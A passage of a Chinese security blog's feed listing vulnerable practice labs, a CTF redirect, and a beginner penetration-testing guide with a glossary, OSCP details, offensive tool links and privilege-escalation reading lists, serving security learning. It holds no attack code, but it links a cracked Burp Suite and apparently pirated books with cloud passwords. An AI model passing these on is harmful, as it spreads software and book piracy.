Boot2root，从启动虚机到获取操作系统的 root 权限和查看 flag。</p><p>相比于 vulhub，这是采用的虚拟机镜像，前者是采用 docker。</p><ul><li>靶场地址：<a href="https://www.vulnhub.com/">https://www.vulnhub.com</a></li></ul><h2 id="webug4-0"><a href="#webug4-0" class="headerlink" title="webug4.0"></a>webug4.0</h2><p>基础环境是基于 PHP/mysql 制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。</p><p>部分漏洞是基于 Windows 操作系统的漏洞所以将 WeBug 的 Web 环境都装在了一个纯净版的 Windows 虚拟机中。</p><ul><li>虚拟机下载地址：<a href="https://pan.baidu.com/s/128ftyRIdCibJu6FJfEKltg">https://pan.baidu.com/s/128ftyRIdCibJu6FJfEKltg</a></li><li>提取码: 5er7</li></ul><h2 id="vulnstack"><a href="#vulnstack" class="headerlink" title="vulnstack"></a>vulnstack</h2><p>红蓝对抗，内网、域渗透最新靶场：</p><ul><li>地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 解题报告</title>
      <link href="/articles/safe/ctf-solving-reports/"/>
      <url>/articles/safe/ctf-solving-reports/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/lyy289065406/CTF-Solving-Reports/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://github.com/lyy289065406/CTF-Solving-Reports/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://github.com/lyy289065406/CTF-Solving-Reports/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 解题报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白帽子渗透测试入门资源：参考书、课程、工具、认证</title>
      <link href="/articles/safe/bai-mao-zi-shen-tou-ce-shi-ru-men-zi-yuan/"/>
      <url>/articles/safe/bai-mao-zi-shen-tou-ce-shi-ru-men-zi-yuan/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>初入渗透测试领域，过程中遇到不少错综复杂的知识，也遇到不少坑，特此记录，慢慢整理慢慢填。</p><h2 id="名词解析"><a href="#名词解析" class="headerlink" title="名词解析"></a>名词解析</h2><table><thead><tr><th align="center">名词</th><th align="center">全称</th><th align="center">解析</th></tr></thead><tbody><tr><td align="center"><a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">PwK</a></td><td align="center">Penetration Testing with Kali Linux</td><td align="center">Kali-Linux 渗透测试培训课程</td></tr><tr><td align="center"><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/">OSCP</a></td><td align="center">Offensive Security Certified Professional</td><td align="center">攻防安全专家认证</td></tr><tr><td align="center"><a href="https://www.owasp.org/">OWASP</a></td><td align="center">Open Web Application Security Project</td><td align="center">开放式Web应用程序安全项目<br>它提供有关计算机和互联网应用程序的公正、实际、<br>有成本效益的信息，如<a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project">《2017 Top 10 应用风险评估报告》</a><br>其目的是协助个人、企业和机构来发现和使用可信赖软件</td></tr><tr><td align="center">SCAP</td><td align="center">Security Content Automation Protocol</td><td align="center">安全内容自动化协议<br>已成立了<a href="http://www.scap.org.cn/">SCAP中文社区</a>，集成了协议框架中的CVE、CCE、<br>CPE、CWE、CVSS、OVAL等6种网络安全相关标准数据库</td></tr><tr><td align="center">CVE</td><td align="center">Common Vulnerabilities and Exposures</td><td align="center">公共漏洞与暴露<br>每个CVE都有唯一编号，是一个漏洞字典表</td></tr><tr><td align="center">EXP</td><td align="center">Exploit</td><td align="center">安全术语，指可利用点（如漏洞、代码等）</td></tr><tr><td align="center">vul</td><td align="center">Vulnerabilities</td><td align="center">安全术语，泛指漏洞</td></tr><tr><td align="center">PoC</td><td align="center">Proof of Concept</td><td align="center">漏洞的概念证明，常见是一段可复盘漏洞的代码</td></tr><tr><td align="center">payload</td><td align="center">-</td><td align="center">安全术语，有效载荷，泛指漏洞利用成功后所要做的事情<br>（如Cracker会做一些有害的或者恶性的动作）</td></tr><tr><td align="center">shellcode</td><td align="center">-</td><td align="center">安全术语，payload的一种，让攻击者获得 shell<br>（由于其建立正向/反向shell而得名）</td></tr><tr><td align="center">WAF</td><td align="center">Web Application Firewall</td><td align="center">Web应用防护系统（也称为：网站应用级入侵防御系统）</td></tr><tr><td align="center">Fuzz</td><td align="center">Fuzz testing</td><td align="center">模糊测试，一种安全测试方法<br>它介于完全的手工测试和完全的自动化测试之间<br>而手工测试是指渗透测试，即模拟Cracker进入系统查找漏洞</td></tr><tr><td align="center">社工</td><td align="center">社会工程学攻击</td><td align="center">安全术语，泛指通过心理战术，欺诈他人<br>以收集信息、行骗和入侵计算机系统的行为</td></tr><tr><td align="center">XSS</td><td align="center">Cross Site Scripting</td><td align="center">跨站脚本攻击（缩写首字母为X是为了不与CSS混淆）<br>根据攻击特点分为：反射型XSS、存储型XSS、DOM-XSS</td></tr><tr><td align="center">DoS</td><td align="center">Denial of Service</td><td align="center">拒绝服务攻击</td></tr><tr><td align="center">DDoS</td><td align="center">Distributed Denial of Service</td><td align="center">分布式拒绝服务攻击</td></tr><tr><td align="center">SQLi</td><td align="center">SQL Inject</td><td align="center">SQL注入式攻击</td></tr><tr><td align="center">CSRF</td><td align="center">Cross-site request forgery</td><td align="center">跨站请求伪造攻击</td></tr><tr><td align="center">CORS</td><td align="center">Cross-Origin Resource Sharing</td><td align="center">跨源资源共享</td></tr><tr><td align="center"><a href="https://gdpr-info.eu/">GDPR</a></td><td align="center">General Data Protection Regulation</td><td align="center">通用数据保护条例，在2018-5-25由欧盟正式出台<br>该条例的适用范围极为广泛，任何收集、传输、保留<br>或处理涉及到欧盟所有成员国内的个人信息的机构组织<br>均受该条例的约束，号称<a href="http://zhuanlan.51cto.com/art/201801/563326.htm">史上最严个人数据保护条例</a></td></tr></tbody></table><blockquote><p>想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 <code>PoC</code>，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了他家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 <code>Exp</code>，你在他家所做的行为就是不同的 <code>Payload</code>，就把窃听器当作 <code>Shellcode</code> 吧！</p></blockquote><h2 id="Pwk课程与OSCP证书"><a href="#Pwk课程与OSCP证书" class="headerlink" title="Pwk课程与OSCP证书"></a>Pwk课程与OSCP证书</h2><p><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/"><strong>OSCP认证</strong></a>：是一个专门针对 <a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/"><strong>PwK课程</strong></a> 的国际安全专业认证。该认证机构声称，OSCP认证是一个区别于所有其它认证的考试，考试全程采取手动操作实战的方式，而不设笔试环节。这是在安全领域含金量非常高的国际认证。</p><p><strong>认证条件</strong>：无</p><p><strong>考试模式</strong>：OSCP的认证考试也是另类的存在，考生拥有24小时的时间（实际是23小时45分钟）去完成考试，具体如何分配时间由考生自己决定。题目是5台主机（随机抽取），目标是攻入并拿到最高权限（ROOT/SYSTEM）。基于难度级别，成功执行的攻击会获得相应的积分。24小时结束之后，你还有24小时去完成并提交考试报告（需要详细说明攻击步骤和里程碑截屏来证明确实攻破并获得相应权限）。</p><p><strong>考试费用</strong>：最低 $ 800 （30天实验室访问学习 + 考试认证）</p><p><strong>相关链接</strong>：</p><ul><li><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/">OSCP概述</a> </li><li><a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">PwK培训材料</a> </li></ul><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>Capture The Flag，夺旗赛。</p><p>通过在线靶场进行实战，磨炼网络安全技巧的一种竞技。这里推荐几个免费的 CTF 站点：</p><ul><li><a href="https://www.root-me.org/?lang=en">Root Me</a></li><li><a href="https://cgctf.nuptsast.com/challenges#Web">CG-CTF</a></li><li><a href="https://github.com/vulhub/vulhub">Vulhub</a></li></ul><p>不建议找答案，勇敢地刷题吧！ 可以很好地锻炼发掘EXP的能（nao）力（dong）~</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><table><thead><tr><th align="center">工具</th><th align="center">简介</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Kali-Linux</td><td align="center">渗透测试的必备工具包<br>Kali是一个基于 Debian 的 Linux 发行版，专门用于渗透测试的工具系统<br>大多数做安全测试的渗透和审计开源工具都被尽可能多地囊括在内</td><td align="center"><a href="https://www.kali.org/downloads/" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">CVEList</td><td align="center">CVE字典表</td><td align="center"><a href="https://github.com/CVEProject/cvelist" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">SecLists</td><td align="center">OWASP维护的一个安全信息列表集合<br>该集合包括了用于渗透的各种类型的列表，<br>这些列表包含了237个字典文件以及常用的 Web Shell 攻击载荷，<br>字典文件类型众多，如用户名、密码、域名、敏感数据特征码、模糊测试载荷等</td><td align="center"><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Exploit Database</td><td align="center">可利用漏洞数据库（在线）<br>罗列了最新被发现的CVE和PoC等信息，可用于学习漏洞原理和复盘</td><td align="center"><a href="https://www.exploit-db.com/" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">SearchSploit</td><td align="center">与 Exploit Database 配套的命令行工具包（已集成到Kali）<br>它把Exploit Database的数据保存在本地机器（攻击方），<br>通过搜集目标机器（防御方）的信息，在本地发现这些信息的EXP，<br>然后在本地机器提取对应的PoC上传到目标机器实现渗透</td><td align="center"><a href="https://www.exploit-db.com/searchsploit" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">Hydra</td><td align="center">弱密码爆破工具（已集成到Kali）</td><td align="center"><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Burp Suite</td><td align="center">用于攻击web 应用程序的集成平台（谁用谁知道）</td><td align="center"><a href="https://portswigger.net/burp" target="_blank" rel="nofollow">官网</a><br><a href="https://share.weiyun.com/5LDUkNW" target="_blank" rel="nofollow">破解版</a><br>密：gsqygf</td></tr><tr><td align="center">Arachni</td><td align="center">基于Ruby的Web漏洞扫描工具<br>算不上强大但有其特色，用于评估web应用程序的安全性<br>不仅能对基本的静态或CMS网站进行扫描，<br>还能识别大部分平台的指纹信息（硬盘序列号和网卡物理地址）</td><td align="center"><a href="http://www.arachni-scanner.com/" target="_blank" rel="nofollow">官网</a><br><a href="https://github.com/Arachni/arachni" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">XSStrike</td><td align="center">基于python的XSS漏洞扫描和利用工具<br>它对参数进行模糊测试之后构建合适的payload，<br>然后对参数进行穷举匹配，大多数payload都是由作者精心构造。<br>其内置爬虫功能，能够检测并尝试绕过WAF，且误报率极低</td><td align="center"><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">XssPy</td><td align="center">基于python的Web应用XSS漏洞智能扫描器<br>它不仅能检查主页或给定页面，还能够检查网站上的所有链接以及子域<br>微软、斯坦福、摩托罗拉、Informatica等很多大型企业机构都在用</td><td align="center"><a href="https://github.com/faizann24/XssPy" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Wfuzz</td><td align="center">Web Fuzzer：Web应用程序评估审查工具<br>它可以对任何字段的HTTP请求中的数据进行模糊处理</td><td align="center"><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">OpenSCAP</td><td align="center">基于C/C++实现的SCAP协议开源框架<br>目的是为SCAP各个标准协议的使用者提供一套简单易用的接口</td><td align="center"><a href="http://www.open-scap.org/" target="_blank" rel="nofollow">官网</a><br><a href="http://www.scap.org.cn/" target="_blank" rel="nofollow">中文社区</a><br><a href="https://github.com/OpenSCAP/openscap" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Hackvertor</td><td align="center">黑客工具包<br>看看黑客们平时都在用什么工具</td><td align="center"><a href="https://hackvertor.co.uk/public" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">SSL/TLS安全评估报告</td><td align="center">检查HTTPS网站的SSL证书安全性</td><td align="center"><a href="https://myssl.com/" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">SecurityHeaders</td><td align="center">通过分析HTTP响应头，评估相关安全选项是否配置得当<br>可根据评估建议修改配置</td><td align="center"><a href="https://securityheaders.com/" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">URL Fuzzer</td><td align="center">扫描Web服务器上的隐藏文件/目录是否存在敏感信息</td><td align="center"><a href="https://pentest-tools.com/website-vulnerability-scanning/discover-hidden-directories-and-files" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">MD5Online</td><td align="center">MD5解密：通过已知的Hash字典逆向爆破<br>（论MD5加salt的重要性）</td><td align="center"><a href="https://www.md5online.org/" target="_blank" rel="nofollow">在线使用</a></td></tr><tr><td align="center">truffleHog</td><td align="center">排查 Git 项目中是否包含可疑的敏感信息</td><td align="center"><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">BFG Repo-Cleaner</td><td align="center">移除 Git 库中的大文件或污点提交</td><td align="center"><a href="https://rtyley.github.io/bfg-repo-cleaner/" target="_blank" rel="nofollow">官网</a><br><a href="https://help.github.com/articles/removing-sensitive-data-from-a-repository/" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">brakeman</td><td align="center">通过静态代码扫描发现代码里的SQL注入问题</td><td align="center"><a href="https://github.com/presidentbeef/brakeman" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">gixy</td><td align="center">Nginx 配置文件静态分析器<br>防止安全配置错误，并自动进行缺陷检测</td><td align="center"><a href="https://github.com/yandex/gixy" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">bleach</td><td align="center">HTML净化器<br>对HTML片段进行标签或属性过滤，预防XSS攻击</td><td align="center"><a href="https://github.com/ecto/bleach" target="_blank" rel="nofollow">Github</a><br><a href="https://pypi.org/project/bleach/" target="_blank" rel="nofollow">Python版</a><br><a href="http://htmlpurifier.org/" target="_blank" rel="nofollow">PHP版</a></td></tr><tr><td align="center">New PHP Snippet</td><td align="center">PHP在线运行环境</td><td align="center"><a href="https://glot.io/new/php" target="_blank" rel="nofollow">在线使用</a></td></tr><tr><td align="center">RequestBin</td><td align="center">临时 HTTP 服务器，用于收集 HTTP 请求，XSS 利器</td><td align="center"><a href="https://requestbin.fullcontact.com/" target="_blank" rel="nofollow">在线使用</a></td></tr></tbody></table><hr><h2 id="参考书"><a href="#参考书" class="headerlink" title="参考书"></a>参考书</h2><table><thead><tr><th align="center">参考书（Kali系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Penetration Testing with Kali Linux (pwk.1.0)</td><td align="center">Kali-Linux渗透测试学习指南<br>PwK官方文档v1.0.1 - 2014版</td><td align="center"><a href="https://share.weiyun.com/5Z23CiY" target="_blank" rel="nofollow">腾讯微云</a><br>密码：4vi4bw</td></tr><tr><td align="center">Instant Kali Linux</td><td align="center">2013<br>Kali快速入门指导</td><td align="center"><a href="https://share.weiyun.com/5ar7k9m" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ryxi47</td></tr><tr><td align="center">Basic Security Testing with Kali Linux</td><td align="center">2014<br>基于Kali的安全测试</td><td align="center"><a href="https://share.weiyun.com/5PrItbo" target="_blank" rel="nofollow">腾讯微云</a><br>密码：qw9ym8</td></tr><tr><td align="center">Hacking with Kali - <br>Practical Penetration Testing Techniques</td><td align="center">2014<br>渗透测试实践技术</td><td align="center"><a href="https://share.weiyun.com/55GnaFY" target="_blank" rel="nofollow">腾讯微云</a><br>密码：xk8a3z</td></tr><tr><td align="center">Kali Linux Cookbook</td><td align="center">2013<br>Kali指导手册</td><td align="center"><a href="https://share.weiyun.com/5sAQ8mB" target="_blank" rel="nofollow">腾讯微云</a><br>密码：xhgjcd</td></tr><tr><td align="center">Kali Linux Social Engineering</td><td align="center">2013<br>基于Kali的社会工程</td><td align="center"><a href="https://share.weiyun.com/5eT0MG3" target="_blank" rel="nofollow">腾讯微云</a><br>密码：gs4xay</td></tr><tr><td align="center">Kali Linux：Assuring Security By Penetration Testing</td><td align="center">2014<br>通过渗透测试确保安全</td><td align="center"><a href="https://share.weiyun.com/5A6P3Ak" target="_blank" rel="nofollow">腾讯微云</a><br>密码：6nrp2k</td></tr><tr><td align="center">Web Penetration Testing with Kali Linux</td><td align="center">2013<br>web应用渗透测试</td><td align="center"><a href="https://share.weiyun.com/5zhW9me" target="_blank" rel="nofollow">腾讯微云</a><br>密码：2cxp9c</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（Metasploit系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Metasploit渗透测试魔鬼训练营</td><td align="center">2013.国内中文原创<br>详细讲解了Metasploit渗透测试的<br>技术、方法和技巧，并提供实战的实验室环境</td><td align="center"><a href="https://share.weiyun.com/5zAbIeM" target="_blank" rel="nofollow">腾讯微云</a><br>密码：i9ihtu</td></tr><tr><td align="center">Metasploit The Penetration Tester's Guide</td><td align="center">2011<br>渗透测试入门指导</td><td align="center"><a href="https://share.weiyun.com/5bl1xRV" target="_blank" rel="nofollow">腾讯微云</a><br>密码：6gurxk</td></tr><tr><td align="center">Metasploit Penetration Testing Cookbook</td><td align="center">Jun.2012<br>渗透测试指导手册</td><td align="center"><a href="https://share.weiyun.com/5KfMxPQ" target="_blank" rel="nofollow">腾讯微云</a><br>密码：r4q73x</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（BackTrack5系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Offensive Security - <br>Penetration Testing with BackTrack (Lab Guide)</td><td align="center">v3.2<br>渗透测试实验室指导手册</td><td align="center"><a href="https://share.weiyun.com/5XzmA5I" target="_blank" rel="nofollow">腾讯微云</a><br>密码：fj9sqt</td></tr><tr><td align="center">BackTrack 5 Wireless Penetration Testing Beginner's Guide</td><td align="center">无线网络渗透测试入门指导</td><td align="center"><a href="https://share.weiyun.com/5Ql8le1" target="_blank" rel="nofollow">腾讯微云</a><br>密码：pdeqfn</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（其他）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">影响力（中文版）</td><td align="center">社会工程学<br>人为什么犯贱？</td><td align="center"><a href="https://share.weiyun.com/5mcRzVn" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ssyf25</td></tr><tr><td align="center">欺骗的艺术（中文版）</td><td align="center">社会工程学<br>世界著名黑客传奇</td><td align="center"><a href="https://share.weiyun.com/5s0Wwqr" target="_blank" rel="nofollow">腾讯微云</a><br>密码：wtpih9</td></tr><tr><td align="center">Learning Nessus for Penetration Testing</td><td align="center">Jan.2014<br>基于Nessus的渗透测试</td><td align="center"><a href="https://share.weiyun.com/5F4iVQ7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：dak9um</td></tr><tr><td align="center">PP.Penetration Testing with the Bash shell</td><td align="center">May.2014<br>基于Bash的渗透测试</td><td align="center"><a href="https://share.weiyun.com/59Ltlbj" target="_blank" rel="nofollow">腾讯微云</a><br>密码：7saehu</td></tr><tr><td align="center">The Basics of Hacking and Penetration Testing<br>( Ethical Hacking and Penetration Testing Made Easy )</td><td align="center">2011<br>渗透测试的基本理论</td><td align="center"><a href="https://share.weiyun.com/50E2OGL" target="_blank" rel="nofollow">腾讯微云</a><br>密码：z9enyr</td></tr><tr><td align="center">The Basics of Hacking and Penetration Testing<br>( Ethical Hacking and Penetration Testing Made Easy )</td><td align="center">The 2nd Edition, 2013<br>渗透测试的基本理论</td><td align="center"><a href="https://share.weiyun.com/5PKAJAU" target="_blank" rel="nofollow">腾讯微云</a><br>密码：5nwjt3</td></tr><tr><td align="center">Advanced Penetration Testing For Highly-Secured <br>Environments The Ultimate Security Guide</td><td align="center">2012<br>终极指南：高安全环境的渗透测试</td><td align="center"><a href="https://share.weiyun.com/5VoihK7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：3u3c9t</td></tr><tr><td align="center">Gray Hat Hacking</td><td align="center">The 2nd Edition<br>灰帽子黑客</td><td align="center"><a href="https://share.weiyun.com/5EwizdA" target="_blank" rel="nofollow">腾讯微云</a><br>密码：4tvjgb</td></tr><tr><td align="center">Hacking - Firewalls And Networks <br>How To Hack Into Remote Computers</td><td align="center">防火墙突破：远程网络渗透</td><td align="center"><a href="https://share.weiyun.com/5CAc1BG" target="_blank" rel="nofollow">腾讯微云</a><br>密码：k93xfx</td></tr><tr><td align="center">Hacking The Art Of Exploitation</td><td align="center">The 2nd Edition, 2018<br>漏洞利用的艺术</td><td align="center"><a href="https://share.weiyun.com/5FDCNeP" target="_blank" rel="nofollow">腾讯微云</a><br>密码：5c5ee6</td></tr><tr><td align="center">Hacking Wireless Networks For Dummies</td><td align="center">2005<br>无线网络窃听</td><td align="center"><a href="https://share.weiyun.com/5f7y3QF" target="_blank" rel="nofollow">腾讯微云</a><br>密码：px7hgj</td></tr><tr><td align="center">Penetration Testing A Hands-On Introduction to Hacking</td><td align="center">2014<br>渗透测试实践指导</td><td align="center"><a href="https://share.weiyun.com/5Wbiij7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：996jfr</td></tr><tr><td align="center">Practical Hacking - Techniques and Countermeasures</td><td align="center">黑客实践的技术与对策</td><td align="center"><a href="https://share.weiyun.com/5ON5FQG" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ne75b9</td></tr></tbody></table><hr><h2 id="相关文献推荐"><a href="#相关文献推荐" class="headerlink" title="相关文献推荐"></a>相关文献推荐</h2><p><strong>社会工程：</strong></p><ul><li>信息安全之社会工程学（<strong>需翻墙</strong>）：<a href="https://program-think.blogspot.com/2009/05/social-engineering-0-overview.html">常识扫盲</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-1-gather-information.html">信息收集</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-2-pretend.html">假冒身份</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-3-influence.html">施加影响</a></li><li><a href="https://blog.csdn.net/pongba/article/details/1662148">《影响力》——人为什么犯贱</a></li><li><a href="https://www.zhihu.com/question/26113526">有哪些「社会工程学」攻击手段？</a></li><li><a href="https://guanjia.qq.com/news/n4/201505/12_18.html">防范社会工程学攻击的技巧与姿势</a></li></ul><p><strong>场景案例：</strong></p><ul><li><a href="https://www.douban.com/note/624958066/">Penetration Testing with Kali (PWK) 课程和 Offensive Security Certified Professional (OSCP) 考试回顾</a></li><li><a href="https://zhuanlan.zhihu.com/p/24249045">XSS实战：我是如何拿下你的百度账号</a></li><li><a href="http://www.kali.org.cn/thread-27331-1-1.html?tdsourcetag=s_pcqq_aiomsg">如何构建自己的渗透测试环境</a></li><li><a href="https://security.tencent.com/index.php/blog/msg/107">驱散前端安全梦魇——DOMXSS典型场景分析与修复指南</a></li><li><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html">CSRF 攻击的应对之道</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/06/ddos.html">DDOS 攻击的防范教程</a></li><li><a href="https://www.freebuf.com/column/138074.html">海量日志中，如何实时在线检测未知异常行为？看瀚思的序列异常算法</a></li><li><a href="https://xz.aliyun.com/t/2860">记一次在实战靶机中使用SearchSploit的总结</a></li><li><a href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">Paypal 2FA Bypass（通过删掉HTTP请求参数绕过验证）</a></li><li><a href="http://www.antiy.com/response/Upatre.html">部分利用社工技巧的群发邮件样本关联分析</a></li></ul><p><strong>主机入侵：</strong></p><ul><li><a href="https://www.qa-knowhow.com/?p=4688">主机威胁入侵检测开源工具与规则</a></li><li><a href="https://blog.csdn.net/AlexTan_/article/details/52080171">OSSEC主要功能及原理+详细配置+日志文件分析</a></li><li><a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-elk/index.html">集中式日志系统 ELK 协议栈详解</a></li><li><a href="https://security.tencent.com/index.php/blog/msg/21">浅谈大型网络入侵检测建设</a></li></ul><p><strong>Linux提权：</strong></p><ul><li><a href="https://payatu.com/guide-linux-privilege-escalation/">A GUIDE TO LINUX PRIVILEGE ESCALATION</a></li><li><a href="https://www.xmsec.cc/guide-linux-privilege-escalation/">Linux提权基础介绍</a>（是前一篇的译文）</li><li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a></li><li><a href="https://www.freebuf.com/articles/system/23993.html">史上最全Linux提权后获取敏感信息方法</a>（是前一篇的译文）</li><li><a href="https://xz.aliyun.com/t/2512">初识linux提权</a></li><li><a href="http://www.4hou.com/technology/2422.html">渗透测试中的Linux提权</a></li><li><a href="https://www.freebuf.com/sectool/121847.html">Linux提权？这四个脚本可以帮助你</a></li><li><a href="https://www.freebuf.com/articles/system/129549.html">Linux提权：从入门到放弃</a></li></ul><p><strong>Windows提权：</strong></p><ul><li><a href="http://www.fuzzysecurity.com/tutorials/16.html">Windows Privilege Escalation Fundamentals</a></li><li>Windows下的渗透测试之提权的基本套路<a href="https://www.anquanke.com/post/id/84852">[上]</a><a href="https://www.anquanke.com/post/id/84855">[下]</a>（是前一篇的译文）</li><li><a href="https://xz.aliyun.com/t/2519">Windows提权笔记</a></li><li><a href="https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html">Privilege Escalation Windows</a></li><li><a href="http://www.4hou.com/system/10212.html">Windows 提权命令指南</a></li><li><a href="https://www.freebuf.com/vuls/87463.html">Windows提权的几种姿势</a></li><li><a href="http://www.secist.com/archives/1070.html">内网渗透之如何玩转Meterpreter？</a></li><li><a href="https://www.freebuf.com/articles/system/184289.html">Windows内核漏洞利用提权教程</a></li><li><a href="https://xz.aliyun.com/t/203">Metasploit、Powershell之AlwaysInstallElevated提权实战</a></li><li><a href="http://drops.xmd5.com/static/drops/tips-2227.html">metasploit 渗透测试笔记(meterpreter篇)</a></li></ul><p><strong>WebShell：</strong></p><ul><li><a href="https://www.jianshu.com/p/02aac12e459f">webshell原理</a></li><li><a href="https://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/">bash反弹shell原理解析</a></li><li><a href="https://www.wxwenku.com/d/244863">基于机器学习的web异常检测</a></li><li><a href="https://www.freebuf.com/articles/rookie/190953.html">机器学习入门之像使用Print一样使用算法检测WebShell</a></li><li><a href="https://sec.ctrip.com/doc/%E6%B6%82%E5%AE%8F%E4%BC%9F-OSSEC%E4%B8%8Ewebshell%E7%9B%91%E6%8E%A7%E6%8E%A2%E7%B4%A2.pdf">OSSEC与webshell实时监控探索</a></li></ul><p><strong>HTTP相关：</strong></p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">HTTP cookies</a></li><li><a href="https://github.com/jin5354/404forest/issues/54">HTTP 安全最佳实践</a></li><li><a href="http://cizixs.com/2016/12/12/restful-api-design-guide/">跟着 Github 学习 Restful HTTP API 设计</a></li></ul><p><strong>其他：</strong></p><ul><li><a href="https://wizardforcel.gitbooks.io/mst-sec-lecture-notes/content/">米斯特白帽培训讲义</a></li><li><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/">知道创宇研发技能表v3.1</a></li><li><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/index.html">大学霸 Kali Linux 安全渗透教程</a></li><li><a href="https://www.freebuf.com/articles/database/68877.html">大数据安全分析漫谈</a></li><li><a href="https://www.freebuf.com/articles/network/124422.html">浅析ReDoS的原理与实践</a></li><li><a href="https://www.freebuf.com/articles/web/155209.html">最好用的开源Web漏扫工具梳理</a></li><li><a href="https://itextpdf.com/blog/how-completely-remove-file-git-repository">How to completely remove a file from a Git repository</a></li><li><a 